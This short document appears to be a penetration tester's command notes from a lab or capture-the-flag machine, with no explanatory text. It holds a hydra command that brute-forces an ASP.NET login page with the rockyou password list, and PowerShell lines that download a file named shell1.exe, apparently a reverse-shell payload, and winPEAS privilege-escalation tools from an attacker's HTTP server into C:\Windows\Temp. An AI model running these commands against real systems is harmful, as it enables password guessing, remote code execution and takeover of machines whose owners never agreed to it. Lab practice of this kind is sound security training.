hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.98.241 http-post-form "/Account/login.aspx:__VIEWSTATE=J7%2FrKT%2FRbzXElHvOFArr4HX0BUp05PUs%2Bjl4fN5QtFnsigr6tjwFZkWaUW9RaCNkl5wcaaA9I71WXBKsdywllsO45a8kdE%2BO2GeciLswYLZgMhEIYMOLKvVE1g9%2FuxmOjygsPrfW43YX1axgD3V%2FmbHd2lx7jcwje7Qgkp065G2LekTQ&__EVENTVALIDATION=nIJxL4rdGJE3KYMzFDmVH35CAPYLfmVh68KpFWCfpmOAp8i4dLgnYkYLVP3UEDV8IiIqX6kXoIwujnQvd7xTK1Tbiqg5RF0fYL3q6nazJk37P%2BrLs8lq043TvaeMwGi4uqTkx2onf8prQt9NNxgtS4oXE0haNUx6xQId8O8kqlZfYRAG&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"

powershell -c "Invoke-WebRequest -Uri 'http://10.9.216.154:8000/shell1.exe' -OutFile 'c:\Windows\Temp\shell1.exe'"

powershell -c "Invoke-WebRequest -Uri 'http://10.9.216.154:8000/winPEASx64.exe' -OutFile 'c:\Windows\Temp\winPEASx64.exe'"

powershell -c "Invoke-WebRequest -Uri 'http://10.9.216.154:8000/winPEASx86.exe' -OutFile 'c:\Windows\Temp\winPEASx86.exe'"

powershell -c "Invoke-WebRequest -Uri 'http://10.9.216.154:8000/winPEAS.bat' -OutFile 'c:\Windows\Temp\winPEAS.bat'"